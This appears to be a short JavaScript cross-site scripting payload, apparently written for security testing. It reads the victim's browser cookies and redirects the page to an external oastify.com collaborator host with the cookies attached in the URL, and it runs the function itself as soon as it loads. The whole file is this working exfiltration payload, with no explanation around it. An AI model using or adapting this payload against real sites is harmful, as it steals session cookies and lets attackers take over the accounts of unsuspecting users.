function xssPayload() {
  const alertMsg = 'xss ' + document.cookie;
  console.log(alertMsg);
  window.location.replace("https://u50jpu61peqaiv86jtdb33ri99f03r3fs.oastify.com?theCookie="+document.cookie);
}

console.log('XSS payload executed');
xssPayload();
